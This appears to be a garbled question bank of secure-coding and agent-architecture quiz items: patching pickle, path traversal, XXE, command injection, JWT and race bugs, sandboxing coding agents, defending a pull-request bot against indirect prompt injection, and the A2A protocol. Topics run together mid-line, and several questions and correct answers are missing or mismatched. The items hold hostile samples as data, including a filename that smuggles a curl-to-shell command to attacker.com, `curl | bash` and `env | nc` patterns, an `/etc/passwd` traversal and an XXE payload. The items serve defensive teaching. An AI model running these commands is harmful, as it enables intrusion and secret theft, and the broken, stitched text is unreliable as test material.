options: Keep `pickle.loads()` but obfuscate the cookie value using XOR encryption with a hardcoded static byte.
Catch `Exception` around `pickle.loads()` and ignore errors silently.
Move the `pickle.loads()` call into a separate Python thread so RCE executes asynchronously.

Replace `pickle.loads()` with cryptographically signed JSON serialization (or `pydantic` schema validation) and replace unsafe `yaml.load()` with `yaml.safe_load()`, verified by Semgrep AST rules and unit tests attempting RCE payload injection.
explanation: Python's `pickle` module executes arbitrary bytecode instructions (`__reduce__`) during deserialization and should never parse untrusted input. Replacing it with safe data formats like signed JSON validated via Pydantic, and using `yaml.safe_load()`, eliminates arbitrary object instantiation. Semgrep rules and exploit unit tests verify complete remediation.

whyWrong.0: XOR obfuscation with a static key is trivially reversible and still allows arbitrary code execution once decoded.
whyWrong.1: Catching exceptions does not prevent `pickle.loads()` from executing OS commands before deserialization completes.
whyWrong.2: Executing RCE in a background thread still compromises the container process and host environment.

hint: Core Rule (Patching Insecure Deserialization Vulnerabilities): Python's `pickle` module executes arbitrary bytecode instructions (`__reduce__`) during deserialization and should never parse untrusted input.

topic: Patching Path Traversal Vulnerabilities (CWE-22)
question: A penetration test revealed a Path Traversal vulnerability (CWE-22) in a Go document-management service: an HTTP handler reads a user-supplied query parameter `filename` and passes `filepath.Join("/var/data/uploads", filename)` directly to `os.ReadFile()`, allowing attackers to pass `../../../../etc/passwd` to read arbitrary system files. How should your Antigravity coding agent patch this vulnerability?
options: Refactor the handler to use Go 1.24+ `os.Root` (`os.OpenRoot("/var/data/uploads")`) or resolve the absolute canonical path via `filepath.Abs` / `filepath.EvalSymlinks` and strictly verify that the resolved path starts with the base directory prefix before opening the file.
Use `strings.ReplaceAll(filename, "../", "")` once on the input string.
Run the Go microservice container as `root` so `os.ReadFile()` never encounters permission errors.
Encrypt the `/etc/passwd` file with a password so the OS can no longer boot.
explanation: In Go, `filepath.Join` cleans paths lexically but does not prevent escaping a base directory if relative segments (`..`) or symlinks resolve outside the root. Using `os.OpenRoot` (which enforces kernel-level directory confinement) or verifying that the canonicalized `filepath.EvalSymlinks` path has the base directory prefix completely prevents CWE-22 path traversal.

whyWrong.1: Single-pass string replacement (`strings.ReplaceAll(filename, "../", "")`) is trivially bypassed using nested sequences like `....//` which collapse into `../` after replacement.
whyWrong.2: Running as root worsens the impact of path traversal by allowing the attacker to read root-only shadow files.
whyWrong.3: Encrypting `/etc/passwd` breaks Linux user authentication and system stability.

hint: Core Rule (Patching Path Traversal Vulnerabilities (CWE-22)): In Go, `filepath.Join` cleans paths lexically but does not prevent escaping a base directory if relative segments (`..`) or symlinks resolve outside the root.

topic: GKE Ephemeral Agent Sandbox Lifecycle Management
question: Your CI/CD system dynamically spawns Kubernetes Jobs on a GKE Sandbox cluster for each pull request, running an autonomous Antigravity agent that generates and executes fuzz tests. topic: Extension Hooks Blocking Dangerous Shell Patterns
question: While troubleshooting build failures, coding agents occasionally attempt risky bash commands such as piping unverified remote scripts to shell (`curl -sSL http://... | bash`), setting world-writable permissions (`chmod -R 777 /`), or dumping environment variables containing tokens (`env | nc ...`). Remove bash and all compilers from the developer workstation so no commands can ever run.

Set the LLM temperature to 2.0 so it generates more creative shell commands.
explanation: Pre-tool extension hooks inspect tool arguments before execution. Parsing proposed `bash` commands against an AST/regex policy blocklist (`curl | bash`, `chmod 777`, reverse shells) and returning a non-zero exit status blocks execution deterministically and returns the policy violation message to the agent.

whyWrong.2: Post-tool hooks run only after the malicious command has already executed and compromised the system.
whyWrong.3: Increasing LLM temperature increases randomness and risk rather than enforcing security boundaries.

hint: Core Rule (Extension Hooks Blocking Dangerous Shell Patterns): Pre-tool extension hooks inspect tool arguments before execution.

whyWrong.3: Combining Rust gRPC servers and React apps into a single HTML file is architecturally invalid.

topic: Patching XML External Entity (XXE) Vulnerabilities
question: A SAST scan identified XML External Entity (XXE - CWE-611) vulnerabilities across 9 legacy Java SOAP/XML parsers that instantiate `javax.xml.parsers.DocumentBuilderFactory.newInstance()` without disabling external DTDs, allowing attackers to read `/etc/shadow` or perform SSRF. How should your Antigravity coding agent remediate these Java classes?
options: Wrap the XML parsing call in a `try { ... } catch (Throwable t) {}` block so exceptions are hidden.
Replace the XML file extension with `.txt` before passing it to the exact same unhardened `DocumentBuilderFactory`.
Upgrade the server's CPU from 4 cores to 8 cores.

Configure the `DocumentBuilderFactory` instance to explicitly set `dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` and disable external general/parameter entities, verified by unit tests passing malicious `<!ENTITY xxe SYSTEM "file:///etc/passwd">` payloads.
explanation: Disabling DTD declarations entirely (`disallow-doctype-decl = true`) or disabling external general and parameter entities in `DocumentBuilderFactory` is the definitive OWASP-recommended defense against XXE injection in Java. Authoring negative unit tests with `<!ENTITY>` payloads proves the parser safely rejects external entities.

whyWrong.0: Catching exceptions does not stop the XML parser from resolving external entities and exfiltrating data during parsing.
whyWrong.1: Changing file extensions has zero effect on how `DocumentBuilderFactory` parses the XML stream.
whyWrong.2: Hardware CPU upgrades have no relationship to XML parser entity resolution vulnerabilities.

hint: Core Rule (Patching XML External Entity (XXE) Vulnerabilities): Disabling DTD declarations entirely (`disallow-doctype-decl = true`) or disabling external general and parameter entities in `DocumentBuilderFactory` is the definitive OWASP-recommended defense against XXE injection in Java.

topic: Patching Broken Object Level Authorization (BOLA / IDOR)

options: Generate automated multi-tenant security integration tests that authenticate as `User-A` (`Tenant-A`), request a resource created by `Tenant-B`, and assert that the API returns `HTTP 404 Not Found` or `HTTP 403 Forbidden`.
Change the invoice primary key from UUIDv4 to sequential integers (`1, 2, 3`) without adding tenant checks.

Refactor the data access layer repository method and SQL query to explicitly scope lookups by the authenticated caller's verified tenant context (`WHERE id = $1 AND tenant_id = $2`) extracted from the validated JWT/session principal.
Ask users in the frontend UI not to type other tenants' UUIDs into the browser address bar.
Remove authentication entirely from `GET /api/v1/invoices/{invoiceId}` so all tenants share all invoices equally.
explanation: Remediating BOLA/IDOR requires enforcing object-level ownership checks at the data access layer using the authenticated principal's cryptographically verified `tenant_id` / `user_id` context (`WHERE id = $1 AND tenant_id = $2`). Authoring automated cross-tenant negative integration tests ensures the authorization boundary cannot regress.

whyWrong.3: Client-side UI warnings provide zero security enforcement against direct API requests.
whyWrong.4: Removing authentication exposes confidential billing data to the entire internet.

hint: Core Rule (Patching Broken Object Level Authorization (BOLA / IDOR)): Remediating BOLA/IDOR requires enforcing object-level ownership checks at the data access layer using the authenticated principal's cryptographically verified `tenant_id` / `user_id` context (`WHERE id = $1 AND tenant_id = $2`).

topic: Container Image Optimization with Coding Agents

A single-stage Dockerfile based on `ubuntu:24.04` that runs `apt-get install -y everything` and deletes `/var/log`.
A Dockerfile that downloads the compiled binary from an unauthenticated HTTP server at container startup time.
A Dockerfile that runs the Go compiler (`go run main.go`) on every incoming HTTP request.
explanation: Multi-stage builds separate build-time toolchains (Go SDK, compilers, Git) from the runtime image. Using `gcr.io/distroless/static-debian12:nonroot` shrinks the final image from 1.4 GB to ~15 MB, eliminates shells and package managers (drastically reducing CVE surface area), and enforces non-root execution.

whyWrong.2: Downloading binaries over unauthenticated HTTP at runtime introduces severe supply-chain tampering risks and startup latency.

Execute Spanner DDL statements over unencrypted public HTTP endpoints without authentication.

topic: GKE Sandbox NetworkPolicy Micro-Segmentation

options: A Kubernetes `Ingress` resource exposing the coding agent pod to the public internet on port 80.
A Kubernetes `ConfigMap` containing the text `please do not connect to prod-payments`.
A `Service` of type `LoadBalancer` with `externalTrafficPolicy: Local`.

A Kubernetes `NetworkPolicy` selecting the coding agent pods with `policyTypes: ["Egress"]` that allows egress solely to pods matching `podSelector: { matchLabels: { app: redis-test } }` on TCP port 6379 and UDP port 53 for cluster DNS, denying all other CIDR destinations.

whyWrong.2: A `LoadBalancer` Service exposes workloads externally and does not restrict outbound pod egress.

hint: Core Rule (GKE Sandbox NetworkPolicy Micro-Segmentation): Kubernetes `NetworkPolicy` resources with explicit `Egress` rules enforce L3/L4 micro-segmentation at the CNI (Dataplane V2 / Cilium) level.

topic: Patching OS Command Injection Vulnerabilities (CWE-78)
question:

A penetration tester demonstrated that uploading a file named `invoice.pdf; curl http://attacker.com/shell.sh | sh #` executes arbitrary OS commands on the container. How should your Antigravity coding agent remediate this CWE-78 vulnerability?
options: Keep `os.system()` but wrap the string in single quotes `'{user_filename}'`.
Add a comment `# nosec` above `os.system()` so Bandit SAST stops reporting the vulnerability.
Run the Python web server as `root` so `pdftoppm` runs faster.

Replace `os.system()` string interpolation with `subprocess.run(["pdftoppm", "-png", "-r", "150", safe_path, "output_prefix"], shell=False, check=True)` after validating that `safe_path` is a server-generated UUID filename inside a restricted directory.
explanation: Passing an argument array to `subprocess.run(..., shell=False)` invokes the OS `execve()` syscall directly without spawning a `/bin/sh` shell interpreter, making shell metacharacter injection (`;`, `|`, `&&`, backticks) impossible. Combining this with server-generated UUID filenames eliminates path and argument injection.

whyWrong.1: Suppressing SAST warnings with `# nosec` leaves the critical RCE vulnerability active in production.
whyWrong.2: Running as root gives any injected command full superuser privileges over the container.

hint: Core Rule (Patching OS Command Injection Vulnerabilities (CWE-78)): Passing an argument array to `subprocess.run(..., shell=False)` invokes the OS `execve()` syscall directly without spawning a `/bin/sh` shell interpreter, making shell metacharacter injection (`;`, `|`, `&&`, backticks) impossible.

topic: Optimizing Python Asyncio Event Loop Bottlenecks

topic: Patching Race Conditions & TOCTOU Vulnerabilities (CWE-367)
question:
A security code review identified a Time-of-Check to Time-of-Use (TOCTOU / Race Condition - CWE-367) vulnerability in a wallet withdrawal microservice:
```python
balance = db.query("SELECT balance FROM wallets WHERE user_id = %s", user_id)
if balance >= amount:
    db.execute("UPDATE wallets SET balance = balance - %s WHERE user_id = %s", amount, user_id)
```
When an attacker sends 20 concurrent withdrawal requests in parallel, all 20 threads read the initial positive balance before any `UPDATE` commits, allowing the attacker to withdraw 20x their actual balance. How should your Antigravity coding agent patch this vulnerability?
options: Add a `time.sleep(0.1)` between the `SELECT` and `UPDATE` statements.
Move the `if balance >= amount:` check into frontend React JavaScript code.
Change the database column type from `NUMERIC` to `VARCHAR`.

Refactor the operation into a single atomic database transaction using pessimistic row-level locking (`SELECT balance FROM wallets WHERE user_id = %s FOR UPDATE`) or an atomic conditional update (`UPDATE wallets SET balance = balance - %s WHERE user_id = %s AND balance >= %s RETURNING balance`), and verify the fix with a multi-threaded concurrent race-condition integration test.
explanation: TOCTOU race conditions occur when state checked in a read query changes before a subsequent write query executes. Wrapping the read in a `SELECT ... FOR UPDATE` row lock inside a transaction or using a single atomic conditional `UPDATE ... WHERE balance >= amount` serializes concurrent attempts at the database engine level. Concurrent multi-threaded tests prove the race condition is eliminated.

whyWrong.0: Adding `time.sleep()` widens the race window, making the TOCTOU vulnerability even easier to exploit.
whyWrong.1: Frontend JavaScript checks are trivially bypassed by sending direct HTTP requests.
whyWrong.2: Changing numeric columns to strings breaks arithmetic operations and does not provide concurrency locking.

hint: Core Rule (Patching Race Conditions & TOCTOU Vulnerabilities (CWE-367)): TOCTOU race conditions occur when state checked in a read query changes before a subsequent write query executes.

whyWrong.3: Calling `runtime.GC()` synchronously on every request triggers stop-the-world pauses and destroys throughput.

whyWrong.0: Banning network communication makes distributed microservices impossible.
whyWrong.2: A 1-nanosecond timeout causes 100% request failure across any network.
whyWrong.3: Infinite immediate retry loops create a thundering herd that worsens cascading outages.

hint: Core Rule (Workspace Rules for Distributed Systems Resiliency): Declaring architectural resiliency patterns in `.antigravity/rules.md` (mandatory context timeouts, exponential backoff with jitter, and circuit breakers) combined with static analysis (`noctx` / custom linter rules) ensures coding agents never emit un-timed `http.DefaultClient` calls or thundering-herd retry loops.

Have the agent approve every PR automatically with `LGTM!` without reading the diff.

Implement a Parallel Review Council subagent pattern: the parent orchestrator dispatches the PR diff simultaneously to 3 specialized subagents (`appsec-reviewer`, `perf-reviewer`, `arch-reviewer`)—each loaded with domain-specific `SKILL.md` rubrics and MCP tools—and then synthesizes, deduplicates, and ranks their findings into structured inline GitHub PR comments.
Assign 3 subagents to edit the exact same line of code simultaneously without coordination.

topic: Patching JWT Authentication Vulnerabilities
question: A penetration test against a custom Node.js authentication gateway revealed two critical JWT vulnerabilities: (1) the gateway accepts tokens with header `{"alg": "none"}` as valid without a signature, and (2) when verifying RS256 tokens using a public RSA key, attackers can change the header to `HS256` and sign the token using the public RSA key string as an HMAC symmetric secret (Algorithm Confusion attack). Which two code remediation steps should your Antigravity coding agent implement? (Choose two.)
options: Author automated security unit tests that forge tokens with `alg: none` and `alg: HS256` signed with the public key, asserting that the verification middleware throws an `InvalidAlgorithm` / `JsonWebTokenError` exception and returns `HTTP 401 Unauthorized`.
Remove signature verification entirely and use `jwt.decode(token)` instead of `jwt.verify(token)`.

Explicitly pass a strict algorithm allowlist (`algorithms: ['RS256']`) to the JWT verification function (`jwt.verify(token, publicKey, { algorithms: ['RS256'], issuer: '...', audience: '...' })`), rejecting `none` and symmetric `HS256` algorithms unconditionally.
Store the private RSA signing key in a public JavaScript file so clients can verify their own tokens.
Set JWT expiration times (`exp`) to 100 years in the future.
explanation: JWT Algorithm Confusion (`RS256` -> `HS256`) and `alg: none` attacks occur when verification libraries trust the `alg` header supplied in the untrusted token. Enforcing an explicit server-side algorithm allowlist (`algorithms: ['RS256']`) alongside `iss` and `aud` validation in `jwt.verify()`, and proving rejection via negative unit tests, completely eliminates both vulnerabilities.

whyWrong.1: `jwt.decode()` only Base64-decodes the payload without verifying cryptographic signatures at all.
whyWrong.3: Exposing private RSA signing keys publicly allows anyone to mint arbitrary administrative tokens.
whyWrong.4: 100-year token lifetimes violate session security best practices and do not fix signature bypass bugs.

hint: Core Rule (Patching JWT Authentication Vulnerabilities): JWT Algorithm Confusion (`RS256` -> `HS256`) and `alg: none` attacks occur when verification libraries trust the `alg` header supplied in the untrusted token.

topic: gRPC Streaming & Serialization Optimization
question: A financial reporting microservice uses a unary gRPC call (`GetMonthlyTransactions`) that returns a single Protocol Buffer message containing an array of 500,000 transaction records (totaling 85 MB). Under load, this unary call causes gRPC `ResourceExhausted: message larger than max (4194304 bytes)` errors and severe memory spikes on both client and server pods. How should your Antigravity coding agent refactor this gRPC service?
options: Refactor the `.proto` definition from a unary RPC to a server-streaming RPC (`rpc StreamMonthlyTransactions(Request) returns (stream TransactionBatch)`), stream chunked batches of 1,000 records over HTTP/2, and enable `gzip`/`zstd` gRPC payload compression.
Increase the gRPC max message size limit to 50 Gigabytes and allocate 128 GB of RAM per pod.
Convert the binary Protocol Buffer payload into verbose XML strings wrapped inside SOAP envelopes.
Drop 99% of the customer's financial transactions randomly so the response fits under 4 MB.
explanation: Unary gRPC calls buffer the entire serialized message in memory before transmission. Refactoring to server-streaming RPC (`returns (stream TransactionBatch)`) enables bounded memory usage, immediate time-to-first-record processing, and avoids gRPC message size limits while leveraging HTTP/2 multiplexing and compression.

whyWrong.1: Buffering multi-gigabyte unary messages in RAM causes GC pauses and OOM crashes under concurrent load.
whyWrong.2: XML/SOAP is significantly larger and slower to parse than binary Protocol Buffers.
whyWrong.3: Randomly dropping financial records corrupts financial reporting.

hint: Core Rule (gRPC Streaming & Serialization Optimization): Unary gRPC calls buffer the entire serialized message in memory before transmission.

topic: Defending Autonomous PR Bots Against Indirect Prompt Injection
question: You deployed an autonomous Antigravity code-review agent that automatically triggers on public GitHub Pull Requests submitted to your open-source SDK repository. How should you architect the review agent's security boundaries to neutralize this indirect prompt injection?
options: Grant the public PR review bot `roles/owner` and unrestricted `bash` access on your internal production VPC.
Ask external attackers nicely in `CONTRIBUTING.md` not to include prompt injections in their PR descriptions.

Enforce defense-in-depth via Agents CLI: (1) pass untrusted PR descriptions through Google Cloud Model Armor prompt-injection detection filters, (2) run the review agent with zero state-mutating or bash execution tools (`allowed-tools: [view_file, add_pr_comment]`), and (3) isolate the runner in a network-restricted GKE Sandbox with no access to production secrets.
Execute every external PR's bash scripts automatically as root before reviewing the text.
explanation: When processing untrusted external inputs (like public GitHub PR descriptions), defense-in-depth requires scanning inputs with Model Armor for prompt-injection payloads AND applying strict least-privilege capability confinement: stripping `bash` and network egress tools so even if the LLM is tricked, it physically lacks the tools or credentials to exfiltrate data or execute commands.

whyWrong.1: Policy text in `CONTRIBUTING.md` does not stop malicious actors.
whyWrong.3: Running untrusted PR scripts as root compromises the build infrastructure immediately.

hint: Core Rule (Defending Autonomous PR Bots Against Indirect Prompt Injection): When processing untrusted external inputs (like public GitHub PR descriptions), defense-in-depth requires scanning inputs with Model Armor for prompt-injection payloads AND applying strict least-privilege capability confinement: stripping `bash` and network egress tools so even if the LLM is tricked, it physically lacks the tools or credentials to exfiltrate data or execute commands.

Provide a code refactoring guide/skill that instructs the agent to add randomized TTL jitter (preventing cache stampedes/thundering herds) and implement local in-memory read-through caching with short TTLs for extreme read hot-keys.
Allow the coding agent to run `FLUSHALL` and `KEYS *` directly on the primary production Redis instance during peak gaming hours.

Expose a non-blocking key-space sampling tool that executes `SCAN` with `MEMORY USAGE` and `TTL` checks (explicitly blocking `KEYS *` which freezes the single-threaded Redis event loop) to identify multi-megabyte keys and keys missing TTL expirations (`TTL = -1`).
Disable Redis authentication (`AUTH`) and expose port 6379 to the public internet.

Exposing cursor-based `SCAN` + `MEMORY USAGE` via MCP safely identifies large keys and missing TTLs (`-1`). Refactoring application code to add TTL jitter prevents synchronized cache stampedes, while local in-memory caching mitigates single-shard hot-key saturation.

whyWrong.2: `FLUSHALL` wipes all cached data causing database collapse, and `KEYS *` freezes the Redis event loop.
whyWrong.4: Exposing unauthenticated Redis instances to the public internet leads to immediate data theft and cryptomining compromises.

hint: Core Rule (Memorystore for Redis / Valkey MCP Server & Hot-Key Optimization): In Redis/Valkey, running `KEYS *` on millions of keys blocks the single-threaded main loop and causes production outages.

question: Your organization runs two types of coding agent workloads on a shared GKE Sandbox cluster: (1) latency-sensitive interactive developer IDE sessions (`interactive-agent`), and (2) asynchronous low-priority nightly repository refactoring batch jobs (`batch-refactoring-agent`). Set CPU requests to `0m` and memory requests to `0Mi` on all pods so the scheduler overcommits nodes until they crash.
Disable GKE Cluster Autoscaler and manually buy physical servers when pods are pending.

topic: Agent2Agent (A2A) Protocol Fundamentals
question: An enterprise architecture board is establishing standards for their next-generation AI platform on Google Cloud. Engineers are confused about when to use the Model Context Protocol (MCP) versus the Agent2Agent (A2A) protocol. A supply chain orchestrator agent needs to: (1) query a deterministic PostgreSQL database schema directly, and (2) delegate a complex multi-turn freight customs clearance negotiation to an autonomous external customs brokerage agent that maintains its own private memory, reasoning loop, and toolset. How should you position MCP and A2A for these two requirements?
options: Use MCP for Requirement 1 (connecting the agent to deterministic tools, database resources, and context primitives) and use A2A for Requirement 2 (horizontal peer-to-peer task delegation, capability discovery, and multi-turn state negotiation between autonomous, opaque reasoning agents).
Use A2A for querying raw SQL database tables directly and use MCP exclusively for cross-company autonomous agent negotiation.
Replace both MCP and A2A with FTP file transfers because neither protocol supports JSON schemas.
MCP and A2A are mutually exclusive protocols that cannot be used within the same Vertex AI Agent Engine runtime.
explanation: MCP (Model Context Protocol) and A2A (Agent2Agent Protocol) are complementary open standards operating at different architectural layers. MCP addresses vertical integration (Agent-to-Tool / Agent-to-Resource), providing structured access to deterministic functions, database schemas, and context templates. A2A addresses horizontal integration (Agent-to-Agent), enabling autonomous agents with private internal state, proprietary models, and independent reasoning loops to discover capabilities via Agent Cards (`/.well-known/agent.json`) and collaborate via stateful asynchronous/streaming tasks.

whyWrong.1: This reverses the protocols: MCP is designed for tool/resource access, whereas A2A is designed for inter-agent task orchestration.
whyWrong.2: Both MCP and A2A natively use JSON-RPC 2.0 and rich JSON schemas over modern HTTP/SSE transports.
whyWrong.3: MCP and A2A are designed to work together harmoniously (an A2A agent frequently uses MCP internally to invoke its own tools).

hint: Core Rule (Agent2Agent (A2A) Protocol Fundamentals): MCP (Model Context Protocol) and A2A (Agent2Agent Protocol) are complementary open standards operating at different architectural layers.

topic: Agent Cards & Discovery
question: A client agent running on Vertex AI Agent Engine needs to dynamically discover the capabilities, supported authentication schemes, JSON-RPC service endpoint URL, and available skills of a remote partner agent hosted at `https://logistics-agent.partner.example.com`. According to the Agent2Agent (A2A) specification, which well-known URI path should the client agent query via an HTTP GET request to retrieve the remote agent's metadata card?
options: https://logistics-agent.partner.example.com/robots.txt
https://logistics-agent.partner.example.com/.well-known/agent.json
https://logistics-agent.partner.example.com/swagger/v1/openapi.yaml
https://logistics-agent.partner.example.com/.env
explanation: The Agent2Agent (A2A) specification standardizes agent capability discovery via RFC 8615 well-known URIs at `/.well-known/agent.json`. Performing an HTTP GET request to this endpoint returns the machine-readable JSON `AgentCard` describing the agent's identity, `url` endpoint, `capabilities` (e.g., `streaming`, `pushNotifications`), `authentication` schemes, input/output MIME types, and `skills` catalog.

whyWrong.0: `/robots.txt` controls web crawler indexing rules and does not contain A2A agent skill schemas or JSON-RPC endpoints.
whyWrong.2: `/swagger/v1/openapi.yaml` describes REST API paths rather than an A2A Agent Card with autonomous skill definitions and task capabilities.
whyWrong.3: `/.env` is a local environment configuration file that should never be exposed publicly.

hint: Core Rule (Agent Cards & Discovery): The Agent2Agent (A2A) specification standardizes agent capability discovery via RFC 8615 well-known URIs at `/.well-known/agent.json`.

topic: Agent Cards & Discovery
question: You are designing an A2A client orchestrator on Vertex AI Agent Engine that interacts with 15 external partner agents. Before submitting a long-running financial audit task to a partner agent, your orchestrator needs to determine whether the partner agent supports real-time Server-Sent Events (SSE) streaming updates or asynchronous webhook callbacks, or if it only supports synchronous blocking calls. Which specific object within the partner's `/.well-known/agent.json` Agent Card should your orchestrator inspect to make this transport decision?

The `provider.organization` string field.
The `capabilities` object (specifically checking the boolean flags `capabilities.streaming` and `capabilities.pushNotifications`).
The HTTP response `Server` header returned by the load balancer.

Inspecting `capabilities` allows dynamic transport negotiation prior to task invocation.

whyWrong.1: `provider.organization` identifies the vendor name and conveys no protocol transport capabilities.
whyWrong.3: HTTP `Server` headers identify reverse proxies (like Envoy or Nginx), not A2A application protocol capabilities.

hint: Core Rule (Agent Cards & Discovery): In the A2A Agent Card schema, the `capabilities` object explicitly declares protocol-level features supported by the remote agent server: `streaming` (boolean indicating support for `tasks/sendSubscribe` via Server-Sent Events), `pushNotifications` (boolean indicating support for `tasks/pushNotification/set` webhook notifications), and `stateTransitionHistory` (boolean indicating whether full state history is returned).

topic: Agent Cards & Discovery
question: You are publishing a specialized Medical Imaging Diagnostic Agent on Vertex AI Agent Engine as an A2A-compliant server. Configure `defaultOutputModes` (or skill-level `outputModes`) to include `['application/json', 'image/png', 'text/plain']`.
Set `capabilities.streaming = False` because A2A protocol only supports ASCII text over SSE.
Leave `inputModes` and `outputModes` completely empty so client agents send MP3 audio files by default.

explanation: In the A2A Agent Card specification, `defaultInputModes` and `defaultOutputModes` (as well as per-skill overrides `skills[].inputModes` and `skills[].outputModes`) specify arrays of standard MIME types that the agent accepts and produces. Declaring `['image/png', 'application/dicom', 'application/json', 'text/plain']` for inputs and `['application/json', 'image/png', 'text/plain']` for outputs allows client orchestrators to validate multimodal payload compatibility (`FilePart` and `DataPart`) before dispatching tasks.

whyWrong.3: Omitting or misconfiguring MIME types leads client agents to send unsupported modalities (like audio) that cause runtime task failures.
whyWrong.4: Agent Cards are lightweight JSON metadata descriptors (typically a few kilobytes), never containers for model weights.

topic: A2A Task Lifecycle & States
question: An A2A client orchestrator sends a task via `tasks/send` to a remote Corporate Travel Booking Agent to book a business class flight from SFO to LHR. While processing the request, the remote agent discovers that the traveler's corporate profile has two valid passports (US and UK) and requires confirmation on which passport nationality to use for Advance Passenger Information (API) before finalizing the airline ticket. According to the A2A Task state machine specification, which `TaskState` should the remote agent transition the task into, and how should the client respond?
options: Transition the task state to `input-required` with a `TaskStatus.message` specifying the passport question; the client agent then sends a follow-up `tasks/send` request using the exact same task `id` and `sessionId` containing the user's selected passport answer.
Transition the task state to `failed`, forcing the client agent to create a brand-new task ID and re-submit all flight search details from scratch.
Transition the task state to `completed` and randomly guess which passport to use.
Transition the task state to `canceled` and delete the user's travel profile.
explanation: The A2A Task lifecycle defines the `input-required` state specifically for multi-turn human-in-the-loop or client clarification pauses. When an agent cannot proceed without additional information or explicit authorization, it returns `status.state = 'input-required'` along with a prompt in `status.message`. To resume execution, the client submits a subsequent `tasks/send` (or `tasks/sendSubscribe`) invocation targeting the **same task `id`** (and `sessionId`), providing the clarifying input message so the remote agent continues from its suspended state.

whyWrong.1: Marking the task as `failed` destroys the in-progress booking context and forces redundant re-execution.
whyWrong.2: Transitioning to `completed` with a guessed passport violates travel compliance and misleads the caller into thinking the task finished properly.
whyWrong.3: `canceled` is a terminal state indicating task termination by user/client request, not a request for clarification.

hint: Core Rule (A2A Task Lifecycle & States): The A2A Task lifecycle defines the `input-required` state specifically for multi-turn human-in-the-loop or client clarification pauses.

topic: A2A Task Lifecycle & States
question: Which of the following represents the complete set of standard task states defined in the Agent2Agent (A2A) protocol `TaskState` enumeration?
options: starting, running, sleeping, zombie, terminated

open, in_progress, pull_request, merged, closed
init, map, shuffle, reduce, finalize
explanation: The A2A specification defines seven standard states in the `TaskState` enum: `submitted` (task received/queued), `working` (agent actively processing), `input-required` (paused awaiting additional client/user input), `completed` (successfully finished terminal state), `canceled` (terminated by client request terminal state), `failed` (unrecoverable error terminal state), and `unknown` (fallback/indeterminate state).

topic: A2A Message & Part Structure
question: An A2A client agent on Vertex AI Agent Engine needs to send a task request to an external ERP Invoice Processing Agent. The request must include both a natural language instruction ('Verify line items against PO #9941'), a structured JSON dictionary containing the purchase order metadata (`{'po_number': 9941, 'currency': 'USD', 'limit': 50000}`), and a 4 MB PDF invoice stored in Cloud Storage (`gs://corp-invoices/inv-882.pdf` or signed HTTPS URI). How should the client structure the `message.parts` array in the A2A `tasks/send` payload?
options: Send three separate unrelated task IDs via `tasks/send` and hope the remote agent correlates them.
Convert the 4 MB PDF binary and JSON dictionary into a single giant ASCII string and place everything inside one `TextPart`.

Construct a single `Message` whose `parts` array contains three typed part objects: a `TextPart` (`type: 'text'`) for the instruction, a `DataPart` (`type: 'data'`) containing the structured JSON PO dictionary, and a `FilePart` (`type: 'file'`) referencing the PDF invoice via `file.uri` and `file.mimeType: 'application/pdf'`.
A2A messages only allow a maximum of one single `TextPart` per message.
explanation: In the A2A protocol, a `Message` consists of a `role` (`user` or `agent`) and an ordered list of multimodal `parts` (`list[Part]`). The `Part` union supports three distinct structured types: `TextPart` (for natural language text), `DataPart` (for arbitrary machine-readable JSON objects/schemas), and `FilePart` (for binary files transferred either inline via base64 `bytes` or by URI reference `uri` with `mimeType`). Combining all three in a single message's `parts` array preserves atomic multimodal context.

whyWrong.0: Sending separate tasks with distinct task IDs breaks transactional context and prevents the remote agent from associating the PDF with the PO metadata.
whyWrong.1: Stuffing binary PDF bytes and JSON into raw text strings corrupts binary encoding and wastes LLM tokens.
whyWrong.3: A2A explicitly supports an array of multiple heterogeneous `Part` objects per `Message`.

hint: Core Rule (A2A Message & Part Structure): In the A2A protocol, a `Message` consists of a `role` (`user` or `agent`) and an ordered list of multimodal `parts` (`list[Part]`).
